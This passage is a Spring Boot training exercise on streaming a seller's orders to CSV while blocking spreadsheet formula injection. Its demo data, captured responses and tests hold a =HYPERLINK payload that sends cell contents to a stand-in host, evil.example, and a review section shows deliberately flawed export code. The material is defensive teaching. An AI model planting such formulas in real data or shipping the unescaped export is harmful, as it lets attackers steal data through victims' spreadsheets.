# Station 093 · Order export to CSV

Working Systems · 0–2 years · Core · E-commerce · Types: Database, Security

Spring Boot 4.1.1 · Java 25 · StreamingResponseBody · JDBC fetch size and cursors · CSV escaping and formula injection · Spring Security 7 · PostgreSQL 17 · Testcontainers. Needs JDK 25 (or 21, see Set up & code) and Docker running (PostgreSQL for the app, Testcontainers for the tests). No Maven install: use `./mvnw` (`.\mvnw.cmd` on Windows).

**Simulation:** The sellers, orders and buyers' cities are demo data, not Kartwala's. The link in the attacker's product name points at an example address.

Read in three levels: 1 Understand (about 5 minutes, no code), 2 Build, 3 Go deeper. Run `./mvnw test` for all 12 tests.

# 1 · Understand

## The problem in real life

1.  **A year of orders**

    A big seller exported a year of orders. The old code read every order into a list, built the whole file as one String, and only then sent it. The server ran out of memory.

2.  **A product that clicks itself**

    Another seller opened an export in Excel. One product name, typed by an attacker, was =HYPERLINK(...). Excel showed it as a link, "Click for refund", that sent data to the attacker's site.

3.  **The fix**

    The export is written row by row while the database hands rows over a thousand at a time, so memory stays flat. Any cell that would start a formula gets a leading apostrophe, and cells are quoted the CSV way.

A file you hand to someone's spreadsheet is code they will run. Write it row by row, and never let a cell start a formula.

## What are we building?

A CSV export of a seller's own orders between two dates, streamed from the database, safe to open in Excel.

## An everyday analogy

A kitchen that plates each dish as it is cooked instead of waiting for all 500, and checks that no customer's note on an order is an instruction to the cashier.

## How it works in 4 steps

1.  **Check** the dates (at most a year) and who is asking: the seller comes from the sign-in.
2.  **Record** the export in a log, then start the answer: a CSV attachment.
3.  **Stream**: the database hands over 1,000 rows at a time; each row is written and forgotten.
4.  **Escape** each text cell: a leading apostrophe for formula characters, quotes for commas and quotes.

Check yourself: is putting a cell like =1+1 in quotes enough to stop the formula?

No. Quotes are CSV syntax: the spreadsheet removes them and still sees =1+1. A leading apostrophe makes it text. That is the Review tab's second finding.

## What this station is not

- **No background jobs.** The export runs in the request; challenge 3 moves big ones to a job.
- **No Excel files.** Only CSV.
- **No buyer names.** Only cities, to keep personal data small.

## Key terms

| Term                    | Simple meaning                                                             | Everyday example                                       | In this project            |
|-------------------------|----------------------------------------------------------------------------|--------------------------------------------------------|----------------------------|
| **CSV**                 | A text file of rows, cells separated by commas, that spreadsheets open.    | A table written on lined paper.                        | `orders-....csv`           |
| **Streaming**           | Sending the file while it is being made, row by row.                       | Serving food as it comes off the stove.                | `StreamingResponseBody`    |
| **Fetch size**          | How many rows the database hands over at a time.                           | Bringing plates out ten at a time.                     | 1,000                      |
| **Formula injection**   | A cell starting with = that a spreadsheet runs as a formula.               | A note in the order book that says "call this number". | `=HYPERLINK(...)`          |
| **Content-Disposition** | A header that tells the browser to save the answer as a file, with a name. | The label on a parcel.                                 | `attachment; filename=...` |
| **Byte order mark**     | Three bytes at the start that tell Excel the file is UTF-8.                | A language sticker on a book.                          | `EF BB BF`                 |

# 2 · Build: Spec

## Business problem

**Kartwala** (a fictional marketplace): exporting a year of orders runs out of memory, and a product named `=HYPERLINK(...)` ran a formula in Excel.

## Acceptance criteria

Demo users: sellers neha.store (seller 1) and arun.mart (seller 2), support sam.help; password: the name before the dot plus `-demo-pass`. Demo rule: at most 366 days, both ends included; days are IST days.

1.  **Given** a valid range, **then** `200`, a UTF-8 CSV attachment with a header and the seller's orders, oldest first.
2.  **Given** a cell starting with = + - @, a tab or CR, **then** it starts with ' in the file; commas and quotes are quoted the RFC 4180 way.
3.  **Given** a million orders, **then** the first lines arrive about as fast as an empty export's.
4.  **Given** another seller's orders, **then** never in the file, whatever the request adds; support `403`; no sign-in `401`.
5.  **Given** a range the wrong way round, over 366 days or not a date, **then** `400`.

## Requirements

- No list of all rows, no whole file in memory.
- Every export recorded before it starts.
- The range rule also in the database.

## Learning objectives

- Stream a response with `StreamingResponseBody` and stream rows from PostgreSQL with a fetch size.
- Escape CSV cells for both CSV and spreadsheets.
- Name and type a download with `Content-Disposition` and a charset.
- Prove streaming with a test that fails when rows are loaded first.

# 2 · Build: API contract

## Endpoint

| Method | Path                                                  | Purpose                                                               |
|--------|-------------------------------------------------------|-----------------------------------------------------------------------|
| `GET`  | `/seller/orders/export?from=YYYY-MM-DD&to=YYYY-MM-DD` | The signed-in seller's orders on those IST days, as a CSV attachment. |

## Status codes

| Status | When                                                          |
|--------|---------------------------------------------------------------|
| 200    | The CSV (the header alone if there are no orders)             |
| 400    | A date that is not a date; to before from; more than 366 days |
| 401    | No sign-in, or a wrong password                               |
| 403    | Not a seller (support)                                        |

## Captured examples

Captured with curl from the running app on 23 Oct 2026, in this order. `Date`, connection and standard security headers are left out; the byte order mark at the start of each CSV is not shown here (its bytes, read by `od`: `ef bb bf`).

### Case 1: Neha exports 2026

**Why:** her five orders, oldest first. The comma, the quotes and the Hindi name are quoted; the formula, the + and the @ start with '.

Request

``` code
GET /seller/orders/export?from=2026-01-01&to=2026-12-31 HTTP/1.1
Authorization: Basic bmVoYS5zdG9yZTpuZWhhLWRlbW8tcGFzcw==
```

Response

``` code
HTTP/1.1 200 
Content-Disposition: attachment; filename="orders-2026-01-01-to-2026-12-31.csv"
Content-Type: text/csv;charset=UTF-8

order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status
KW-1001,2026-01-05 10:15,"Cotton kurta, blue",2,1299.00,Pune,DELIVERED
KW-1002,2026-03-17 23:50,"Mug ""Chai time""",1,349.00,Chennai,SHIPPED
KW-1003,2026-06-30 18:29,"'=HYPERLINK(""http://evil.example/?d=""&A1,""Click for refund"")",1,99.00,Delhi,PLACED
KW-1004,2026-07-01 09:00,'+91 Special offer,3,597.00,'@Mumbai,CANCELLED
KW-1005,2026-12-31 23:59,"साड़ी, सिल्क",1,4599.00,Varanasi,PLACED
```

### Case 2: Arun exports 2026

**Why:** only his order: the seller comes from the sign-in.

Request

``` code
GET /seller/orders/export?from=2026-01-01&to=2026-12-31 HTTP/1.1
Authorization: Basic YXJ1bi5tYXJ0OmFydW4tZGVtby1wYXNz
```

Response

``` code
HTTP/1.1 200 
Content-Disposition: attachment; filename="orders-2026-01-01-to-2026-12-31.csv"
Content-Type: text/csv;charset=UTF-8

order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status
AM-2001,2026-02-11 12:00,Steel bottle,1,499.00,Kochi,DELIVERED
```

### Case 3: 30 June 2026

**Why:** 18:29 IST is that day; KW-1004 at 09:00 IST on 1 July is not.

Request

``` code
GET /seller/orders/export?from=2026-06-30&to=2026-06-30 HTTP/1.1
Authorization: Basic bmVoYS5zdG9yZTpuZWhhLWRlbW8tcGFzcw==
```

Response

``` code
HTTP/1.1 200 
Content-Disposition: attachment; filename="orders-2026-06-30-to-2026-06-30.csv"
Content-Type: text/csv;charset=UTF-8

order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status
KW-1003,2026-06-30 18:29,"'=HYPERLINK(""http://evil.example/?d=""&A1,""Click for refund"")",1,99.00,Delhi,PLACED
```

### Case 4: 367 days

**Why:** `400`.

Request

``` code
GET /seller/orders/export?from=2025-01-01&to=2026-01-02 HTTP/1.1
Authorization: Basic bmVoYS5zdG9yZTpuZWhhLWRlbW8tcGFzcw==
```

Response

``` code
HTTP/1.1 400 
Content-Type: application/problem+json

{
  "detail": "from must be on or before to, and at most a year apart",
  "instance": "/seller/orders/export",
  "status": 400,
  "title": "Bad Request"
}
```

### Case 5: month 13

**Why:** `400`.

Request

``` code
GET /seller/orders/export?from=2026-01-01&to=2026-13-01 HTTP/1.1
Authorization: Basic bmVoYS5zdG9yZTpuZWhhLWRlbW8tcGFzcw==
```

Response

``` code
HTTP/1.1 400 
Content-Type: application/problem+json

{
  "detail": "Failed to convert 'to' with value: '2026-13-01'",
  "instance": "/seller/orders/export",
  "status": 400,
  "title": "Bad Request"
}
```

### Case 6: support

**Why:** `403`: buyers' data is for the seller.

Request

``` code
GET /seller/orders/export?from=2026-01-01&to=2026-12-31 HTTP/1.1
Authorization: Basic c2FtLmhlbHA6c2FtLWRlbW8tcGFzcw==
```

Response

``` code
HTTP/1.1 403 
Content-Type: application/problem+json
Content-Length: 111

{
  "title": "Not allowed",
  "status": 403,
  "detail": "This sign-in cannot do this.",
  "instance": "/seller/orders/export"
}
```

### Case 7: no sign-in

**Why:** `401`.

Request

``` code
GET /seller/orders/export?from=2026-01-01&to=2026-12-31 HTTP/1.1
```

Response

``` code
HTTP/1.1 401 
WWW-Authenticate: Basic realm="kartwala"
Content-Type: application/problem+json
Content-Length: 123

{
  "title": "Sign-in required",
  "status": 401,
  "detail": "Send a valid username and password.",
  "instance": "/seller/orders/export"
}
```

## The export log afterwards

Seller, from, to. Refused requests left no entry; the last line is the export `docs/capture.sh` ran to read the byte order mark.

``` code
 seller_id | from_date  |  to_date   
-----------+------------+------------
         1 | 2026-01-01 | 2026-12-31
         2 | 2026-01-01 | 2026-12-31
         1 | 2026-06-30 | 2026-06-30
         1 | 2026-01-01 | 2026-12-31
(4 rows)
```

# 2 · Build: Edge cases & trap

## Edge cases

| Case                                                       | What happens                                 | Proved by                                                     |
|------------------------------------------------------------|----------------------------------------------|---------------------------------------------------------------|
| A year of orders                                           | Attachment, charset, BOM, every line exact   | `aYearOfOrdersAsAnAttachmentInIstDaysOldestFirst`             |
| One IST day; a month with no orders                        | That day only; the header alone              | `theDaysAreIndianDays`                                        |
| Wrong way round, 367 days, month 13; 366 days; a leap year | `400`; `200`                                 | `badRangesAre400`                                             |
| Signs, tabs, line breaks, empty cells, = inside text       | Escaped only where needed                    | `cellsAreEscapedTheSpreadsheetWay`                            |
| The old way                                                | A formula cell, a split cell                 | `theOldWayHeldEverythingAndPassedTheFormulaOn`                |
| The API on the same orders                                 | Neutralised and quoted                       | `theApiNeutralisesFormulasAndQuotesCells`                     |
| A million orders                                           | First lines about as fast as an empty export | `theFirstLinesArriveLongBeforeAllRowsCouldHaveBeenRead`       |
| No sign-in, a wrong password, support                      | `401`, `401`, `403`, nothing logged          | `withoutASignInIt401sAndSupportMayNotExport`                  |
| Another seller's orders, also with ?sellerId=1             | Never in the file                            | `aSellerExportsOnlyTheirOwnOrdersWhateverTheyAddToTheRequest` |
| SQL and paths in the dates                                 | `400`                                        | `maliciousDatesAreRefused`                                    |
| Rules written by plain SQL                                 | Refused by named constraints                 | `orderAndExportRulesHoldWithoutJava`                          |
| The log cannot be written                                  | No export                                    | `anExportThatCannotBeLoggedDoesNotStart`                      |

## The trap

Plausible but wrong

Building the whole file in memory, and not escaping cells that start with '='.

- **The old way.** The test reads every order into a list and joins the cells with commas into one String. The file has a line starting `KW-1003,=HYPERLINK(`, a formula, and "Cotton kurta, blue" splits into two cells.
- **The API.** The same orders: the formula starts with `'` and is quoted, and the kurta's name is one cell.
- **Memory.** `StreamingExportTest` exports a million orders on a real port: the first lines arrive about as fast as an empty export, long before every row could have been read.

While building, each part was undone once: no fetch size turned 1 test red; no transaction 1; no formula guard 3; no quoting 2; no byte order mark 3; UTC days 4; any seller's orders 3; no range check 1; no export log 2.

``` code
package com.kartwala.export;

import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Written first. The old export loaded every order into a list and joined the cells with commas into one String.
 * A year of orders ran the server out of memory, and a product named =HYPERLINK(...) became a working link the
 * moment the seller opened the file. These tests run the old way and the API on the same orders.
 */
class FormulaAndMemoryTrapTest extends ApiTest {

    record Row(String ref, String product, int quantity, long paise, String city) {
    }

    @Test
    void theOldWayHeldEverythingAndPassedTheFormulaOn() {
        List<Row> all = jdbc.sql("SELECT order_ref AS ref, product_name AS product, quantity, amount_paise AS paise, buyer_city AS city FROM orders WHERE seller_id = 1 ORDER BY placed_at")
                .query(Row.class).list();   // every row at once
        String csv = String.join("\n", all.stream().map(r -> String.join(",", r.ref(), r.product(), "" + r.quantity(),
                BigDecimal.valueOf(r.paise(), 2).toPlainString(), r.city())).toList());   // the whole file at once
        assertThat(csv.lines()).anyMatch(l -> l.startsWith("KW-1003,=HYPERLINK("));   // a formula cell
        assertThat(csv.lines().filter(l -> l.startsWith("KW-1001")).findFirst().orElseThrow().split(",")).hasSize(6);   // "kurta, blue" split in two
    }

    @Test
    void theApiNeutralisesFormulasAndQuotesCells() throws Exception {
        List<String> lines = lines(export("neha.store", "2026-01-01", "2026-12-31"));
        assertThat(lines).contains(
                "KW-1001,2026-01-05 10:15,\"Cotton kurta, blue\",2,1299.00,Pune,DELIVERED",
                "KW-1003,2026-06-30 18:29,\"'=HYPERLINK(\"\"http://evil.example/?d=\"\"&A1,\"\"Click for refund\"\")\",1,99.00,Delhi,PLACED",
                "KW-1004,2026-07-01 09:00,'+91 Special offer,3,597.00,'@Mumbai,CANCELLED");
    }
}
```

# 2 · Build: Set up & code

## Set up and run

| You need | Version                                                           | Check with      |
|----------|-------------------------------------------------------------------|-----------------|
| JDK      | 25 (recommended). JDK 21 also works, see below                    | `java -version` |
| Docker   | Docker Desktop (Windows, macOS) or Docker Engine (Linux), running | `docker info`   |
| Maven    | Not needed: the project ships the Maven wrapper                   |                 |

**macOS / Linux**

``` code
docker compose up -d        # PostgreSQL 17 on localhost:5432
./mvnw spring-boot:run      # the API on http://localhost:8080
./mvnw test                 # all 12 tests; starts its own PostgreSQL container
```

**Windows (PowerShell)**

``` code
docker compose up -d
.\mvnw.cmd spring-boot:run
.\mvnw.cmd test
```

On JDK 21, add `-Djava.version=21`. Nothing here needs a Java 25 feature. The full test run takes longer than most stations: one test exports a million orders.

## Try it yourself

Download Neha's 2026 orders and open the file in a spreadsheet:

``` code
curl -u neha.store:neha-demo-pass -o orders.csv 'http://localhost:8080/seller/orders/export?from=2026-01-01&to=2026-12-31'
```

The file is case 1. Product KW-1003 shows as text starting `'=HYPERLINK`, not as a link, and the Hindi name reads correctly.

## Troubleshooting

| You see                                         | Cause                                                                                                                   | Fix                                                                  |
|-------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------|
| Memory grows with the export's size             | Rows read all at once: no fetch size, or no transaction (PostgreSQL's driver then reads everything).                    | Set `spring.jdbc.template.fetch-size` and read inside a transaction. |
| The first row takes seconds even when streaming | The database sorts every row before the first: the plan does not follow an index, often because statistics are missing. | `ANALYZE` (autovacuum does it in time); check with `EXPLAIN`.        |
| Excel shows garbled Hindi                       | No byte order mark: Excel guesses another encoding.                                                                     | Write `EF BB BF` first.                                              |
| `Could not find a valid Docker environment`     | Docker is not running.                                                                                                  | Start Docker Desktop or the Docker service.                          |

## Project layout

``` tree
stations/093-order-export-to-csv/
├── pom.xml, mvnw, mvnw.cmd, .mvn/, compose.yaml
├── src/main/java/com/kartwala/export/
│   ├── SecurityConfig.java   ├── ExportController.java   ├── OrderExport.java   ├── Csv.java
│   └── ProblemResponses.java   └── ExportApplication.java
├── src/main/resources/
│   ├── application.yaml
│   └── db/migration/   V1__orders_and_export_log.sql, V2__demo_orders.sql
├── src/test/java/com/kartwala/export/   (see Tests)
├── challenge/                Practice tests; solutions ship separately
├── review/                   The flawed version (see Review)
└── docs/                     capture script, captures, saved runs
```

## Code walkthrough

In the order a request travels, then the database behind it.

#### `src/main/java/com/kartwala/export/SecurityConfig.java`

Does  
Who may export.

Why  
HTTP Basic; sellers only; everything else refused.

Without it  
Support or anyone downloading buyers' data.

#### `src/main/java/com/kartwala/export/ExportController.java`

Does  
The endpoint.

Why  
Checks the range, takes the seller from the sign-in, records the export, and returns a `StreamingResponseBody` with a CSV type, a charset and a file name.

Without it  
A request that names another seller's id.

#### `src/main/java/com/kartwala/export/OrderExport.java`

Does  
Reading and writing, row by row.

Why  
A read-only transaction, so the PostgreSQL driver uses a cursor with the fetch size; each row goes straight to the writer.

Without it  
A year of orders in memory.

- The PostgreSQL driver uses a cursor only inside a transaction and with a fetch size. Without either, it reads every row before handing over the first: about 2 s instead of about 50 ms for a million rows here. Found while building.
- A byte order mark first, so Excel reads UTF-8.
- If the client goes away, the write fails and reading stops.

#### `src/main/java/com/kartwala/export/Csv.java`

Does  
One cell, safe for CSV and for spreadsheets.

Why  
A leading `'` for = + - @ tab CR, then RFC 4180 quoting.

Without it  
Formulas run on the seller's computer; cells split at commas.

#### `src/main/java/com/kartwala/export/ProblemResponses.java`

`401` and `403` in the same problem shape as other errors.

#### `src/main/resources/db/migration/V1__orders_and_export_log.sql`

Does  
Orders and the export log.

Why  
Named constraints; the range rule in the log; an index on seller and time.

Without it  
Bad rows, or a log entry for an export the API would refuse.

#### `src/main/resources/db/migration/V2__demo_orders.sql`

Six orders, some with names a real seller types and some an attacker would.

#### `src/main/resources/application.yaml`

`spring.jdbc.template.fetch-size: 1000`.

#### `compose.yaml`

PostgreSQL 17 for running the app.

#### `src/main/java/com/kartwala/export/ExportApplication.java`

Entry point.

# 2 · Build: Tests

## Required tests for this station

| Required by   | Requirement                                                       | Test class                                                | Result |
|---------------|-------------------------------------------------------------------|-----------------------------------------------------------|--------|
| Every station | HTTP contract: valid, invalid, not found                          | `ExportContractTest` (4)                                  | pass   |
| Every station | Reproduce the failure before the fix                              | `FormulaAndMemoryTrapTest` (2), `StreamingExportTest` (1) | pass   |
| Database      | Rollback and constraint tests against a real database             | `ExportDatabaseTest` (2)                                  | pass   |
| Security      | 401, 403, one user accessing another user's data, malicious input | `ExportSecurityTest` (3)                                  | pass   |

How to prove streaming took three tries. A check that PostgreSQL still had the query open could not tell streaming from loading everything (the transaction is open in both). Timing a million rows works: the first lines arrive about as fast as an empty export, while reading every row takes seconds, so loading them first could not be that fast. And at first even the streaming version was slow: on a fresh table without statistics, PostgreSQL sorted the whole year before the first row; after `ANALYZE` it reads the index in order. Found while building.

## Run output

JDK 25.0.1, Spring Boot 4.1.1, PostgreSQL 17 in Testcontainers. Nothing skipped. Saved in `docs/test-run.txt`.

``` console
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.StreamingExportTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.FormulaAndMemoryTrapTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.ExportSecurityTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.ExportDatabaseTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0 -- in com.kartwala.export.ExportContractTest
[INFO] Tests run: 12, Failures: 0, Errors: 0, Skipped: 0
[INFO] BUILD SUCCESS
```

## Test files

#### `src/test/java/com/kartwala/export/FormulaAndMemoryTrapTest.java`

Written first: the old list-and-join way against the API.

#### `src/test/java/com/kartwala/export/StreamingExportTest.java`

A million orders on a real port: first lines against reading every row.

#### `src/test/java/com/kartwala/export/ExportContractTest.java`

The file, line by line; IST days; ranges; cell escaping.

#### `src/test/java/com/kartwala/export/ExportSecurityTest.java`

401, 403, another seller's orders, malicious dates.

#### `src/test/java/com/kartwala/export/ExportDatabaseTest.java`

Named constraints with plain SQL; an export that cannot be logged.

#### `src/test/java/com/kartwala/export/ApiTest.java`

Shared setup: the demo orders before each test; the async helper that reads a streamed answer.

#### `src/test/java/com/kartwala/export/PostgresTestConfig.java`

PostgreSQL 17 in Docker via Testcontainers.

# 2 · Build: Practice

## How to do a challenge

1.  Copy the challenge test from `challenge/` into `src/test/java/com/kartwala/export/`.
2.  Run it and watch it fail: `./mvnw test -Dtest=StatusFilterChallengeTest` (Docker must be running).
3.  Change the code until it passes, then run `./mvnw test` to check the other 12 tests.

Checked (`docs/challenge-run.txt`): with the reference solutions copied in, all 16 tests pass (12 station tests and 4 challenge tests).

Challenge 1 · Beginner-friendly · about 20 minutes

## Only shipped orders

An optional `?status=PLACED|SHIPPED|DELIVERED|CANCELLED` exports only orders in that state; any other value is `400`.

**Done when:** both tests in `StatusFilterChallengeTest` pass.

Hints

- `@Pattern` on an optional request parameter.
- One query for both cases: `(CAST(? AS text) IS NULL OR status = ?)`.

#### `challenge/StatusFilterChallengeTest.java`

``` code
package com.kartwala.export;

import org.junit.jupiter.api.Test;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.test.web.servlet.MvcResult;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.httpBasic;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.asyncDispatch;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;

/** Challenge 1: ?status=PLACED (optional) exports only orders in that state; an unknown state is 400. */
class StatusFilterChallengeTest extends ApiTest {

    MockHttpServletResponse exportWithStatus(String status) throws Exception {
        MvcResult started = mvc.perform(get("/seller/orders/export").param("from", "2026-01-01").param("to", "2026-12-31").param("status", status)
                .with(httpBasic("neha.store", password("neha.store")))).andReturn();
        return started.getRequest().isAsyncStarted() ? mvc.perform(asyncDispatch(started)).andReturn().getResponse() : started.getResponse();
    }

    @Test
    void onlyOrdersInThatState() throws Exception {
        var placed = lines(exportWithStatus("PLACED"));
        assertThat(placed).hasSize(3).first().isEqualTo(OrderExport.HEADER);
        assertThat(placed.subList(1, 3)).allMatch(l -> l.endsWith(",PLACED"));
        assertThat(lines(export("neha.store", "2026-01-01", "2026-12-31"))).hasSize(6);   // without it, every state
    }

    @Test
    void anUnknownStateIs400() throws Exception {
        assertThat(exportWithStatus("LOST").getStatus()).isEqualTo(400);
    }
}
```

*Solution: in the separate solutions pack. Try first.*

Challenge 2 · Go deeper · about 30 minutes

## Export history

`GET /seller/exports`: the seller's own exports, newest first, each with `rowsSent`. The count is known only when the stream ends, so a V3 migration adds `rows_sent`, filled in after the last row.

**Done when:** both tests in `ExportHistoryChallengeTest` pass.

Hints

- Keep the log entry's id from the insert and update it after the last row is written.
- An export cut off by the client leaves `rows_sent` empty: that is information too.

#### `challenge/ExportHistoryChallengeTest.java`

``` code
package com.kartwala.export;

import org.junit.jupiter.api.Test;

import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.httpBasic;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Challenge 2: GET /seller/exports lists the seller's own exports, newest first, each with the number of orders it
 * sent. The number is known only when the stream ends: a V3 migration adds rows_sent, filled in after the last row.
 */
class ExportHistoryChallengeTest extends ApiTest {

    @Test
    void aSellerSeesTheirOwnExportsWithHowManyOrdersEachSent() throws Exception {
        export("neha.store", "2026-01-01", "2026-12-31");
        export("neha.store", "2026-06-30", "2026-06-30");
        export("arun.mart", "2026-01-01", "2026-12-31");
        mvc.perform(get("/seller/exports").with(httpBasic("neha.store", password("neha.store")))).andExpect(status().isOk())
                .andExpect(jsonPath("$.length()").value(2))
                .andExpect(jsonPath("$[0].from").value("2026-06-30")).andExpect(jsonPath("$[0].rowsSent").value(1))
                .andExpect(jsonPath("$[1].rowsSent").value(5));
        mvc.perform(get("/seller/exports").with(httpBasic("arun.mart", password("arun.mart")))).andExpect(jsonPath("$.length()").value(1));
    }

    @Test
    void supportAndStrangersCannotSeeIt() throws Exception {
        mvc.perform(get("/seller/exports").with(httpBasic("sam.help", password("sam.help")))).andExpect(status().isForbidden());
        mvc.perform(get("/seller/exports")).andExpect(status().isUnauthorized());
        mvc.perform(get("/seller/exports").with(httpBasic("neha.store", password("neha.store")))).andExpect(content().json("[]"));
    }
}
```

*Solution: in the separate solutions pack. Try first.*

Challenge 3 · design on paper, no code

## Exports as jobs

A seller with five million orders a year asks for an export. Even streamed, the request runs for minutes, through load balancers that cut it at 60 seconds. Design it as a job: `202` with a job id, the file written to object storage, a time-limited download link, and an email when ready. What still streams, and where?

# 3 · Go deeper: Design

## Implementation approach

1.  Write the trap test: the old list-and-join way.
2.  Write `Csv.text` with its rules and tests.
3.  Stream: `StreamingResponseBody`, a read-only transaction, a fetch size, a writer per row.
4.  Prove it with a test that fails when rows are loaded first; then lock down who may export what.

## Design alternatives and trade-offs

| Approach                                  | What it costs                                                      | Verdict             |
|-------------------------------------------|--------------------------------------------------------------------|---------------------|
| Stream rows from a cursor to the response | The connection is held while the file downloads.                   | Chosen              |
| Load all rows, build the file, send it    | Memory grows with the export; nothing is sent until the end.       | The trap            |
| Quote formula cells                       | Quotes are CSV syntax; the formula still runs.                     | Review finding      |
| Page through with LIMIT/OFFSET            | Many queries; later pages get slower; rows can move between pages. | Worse than a cursor |
| A background job to object storage        | More parts; no time limit on the request.                          | For huge exports    |

## Database design

| Object                                                                | What                      | Why                                                   |
|-----------------------------------------------------------------------|---------------------------|-------------------------------------------------------|
| `orders_seller_time`                                                  | Index (seller, placed_at) | The export reads one seller's range in time order.    |
| `export_log_range`                                                    | CHECK                     | At most 366 days, in the right order, for any writer. |
| `orders_ref_once_per_seller`                                          | UNIQUE                    | One order ref per seller.                             |
| `orders_quantity_positive`, `orders_amount_positive`, `orders_status` | CHECKs                    | Rows an export can trust.                             |

**Transaction boundaries:** the log entry is committed first. The rows are read in one read-only transaction, open for as long as the file takes to write.

``` code
CREATE TABLE orders (
    id           bigint GENERATED ALWAYS AS IDENTITY CONSTRAINT orders_pk PRIMARY KEY,
    seller_id    bigint NOT NULL,
    order_ref    text NOT NULL,
    placed_at    timestamptz NOT NULL,
    product_name text NOT NULL,
    quantity     integer NOT NULL,
    amount_paise bigint NOT NULL,
    buyer_city   text NOT NULL,
    status       text NOT NULL,
    CONSTRAINT orders_ref_once_per_seller UNIQUE (seller_id, order_ref),
    CONSTRAINT orders_quantity_positive CHECK (quantity > 0),
    CONSTRAINT orders_amount_positive CHECK (amount_paise > 0),
    CONSTRAINT orders_status CHECK (status IN ('PLACED', 'SHIPPED', 'DELIVERED', 'CANCELLED'))
);
CREATE INDEX orders_seller_time ON orders (seller_id, placed_at);

-- Every export of buyers' data is recorded before it starts: who, which days, when.
CREATE TABLE export_log (
    id          bigint GENERATED ALWAYS AS IDENTITY CONSTRAINT export_log_pk PRIMARY KEY,
    seller_id   bigint NOT NULL,
    from_date   date NOT NULL,
    to_date     date NOT NULL,
    exported_at timestamptz NOT NULL DEFAULT now(),
    -- Demo rule: at most a year per export, 366 days with both ends included.
    CONSTRAINT export_log_range CHECK (to_date >= from_date AND to_date - from_date < 366)
);
```

# 3 · Go deeper: Production

Connections  
A streaming export holds a database connection until the download ends; a slow client holds it longer. Limit concurrent exports per seller and size the pool for them.

Time limits  
Load balancers and proxies cut long responses (60 seconds is common). Beyond that, use a job (challenge 3).

Personal data  
Exports carry buyers' data out of your systems: log them, limit them, and keep columns to what the seller needs.

Async requests  
`StreamingResponseBody` runs on another thread; set `spring.mvc.async.request-timeout` to something an export can finish in.

# 3 · Go deeper: Interview

## Interview takeaways

How do you export a million rows without running out of memory?

Stream: write the response while reading rows from a database cursor, a few thousand at a time, keeping nothing.

What does PostgreSQL's JDBC driver need to stream rows?

A fetch size and a transaction (autocommit off). Otherwise it reads the whole result before returning the first row.

What is CSV injection?

Text that a spreadsheet runs as a formula because it starts with =, +, - or @. Prefix such cells with an apostrophe.

Isn't quoting the cell enough?

No: quotes are part of CSV, not of the cell. The spreadsheet removes them and runs the formula.

How do you test that a response streams?

Make the data big enough that loading it takes seconds, and check that the first lines arrive long before that.

## Self-check rubric

| Area        | Meets the bar              | Above the bar                                                                  |
|-------------|----------------------------|--------------------------------------------------------------------------------|
| Correctness | All 12 tests pass.         | You ran the flawed version and explained each failure.                         |
| Streaming   | StreamingResponseBody.     | Rows streamed from the database too, proven by a test.                         |
| Cells       | Commas and quotes handled. | Formula characters neutralised, and you can explain why quoting is not enough. |
| Access      | Sellers only.              | The seller from the sign-in, exports logged.                                   |

# 3 · Go deeper: Review

## The pull request

A teammate simplifies the export: rows are read into a list first, "so the connection goes back to the pool sooner", and the escaping becomes one rule: quote any cell with a comma, a quote, a line break, or a leading =. Read both files and list every problem before opening the findings.

#### `review/OrderExport.java`

``` code
package com.kartwala.export;

import org.springframework.jdbc.core.simple.JdbcClient;
import org.springframework.stereotype.Service;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.support.TransactionTemplate;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UncheckedIOException;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.time.OffsetDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.List;

@Service
class OrderExport {

    static final ZoneId IST = ZoneId.of("Asia/Kolkata");
    static final String HEADER = "order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status";
    private static final DateTimeFormatter TIME = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm");

    private final JdbcClient jdbc;
    private final TransactionTemplate readOnly;

    OrderExport(JdbcClient jdbc, PlatformTransactionManager transactions) {
        this.jdbc = jdbc;
        this.readOnly = new TransactionTemplate(transactions);
        this.readOnly.setReadOnly(true);
    }

    /** Recorded before the first byte is sent; the database refuses a range of more than a year from any writer. */
    void log(long sellerId, LocalDate from, LocalDate to) {
        jdbc.sql("INSERT INTO export_log (seller_id, from_date, to_date) VALUES (?, ?, ?)").params(sellerId, from, to).update();
    }

    /**
     * Writes the seller's orders, oldest first, as rows arrive from the database: PostgreSQL hands them over 1,000 at a
     * time through a cursor (fetch size, in a transaction), and each row is written and forgotten. Memory stays the
     * same for ten orders or a year of them. The days are IST days.
     */
    void write(long sellerId, LocalDate from, LocalDate to, OutputStream out) throws IOException {
        BufferedWriter w = new BufferedWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8));
        w.write('\uFEFF');   // a byte order mark, so Excel reads the file as UTF-8 (Hindi product names)
        w.write(HEADER);
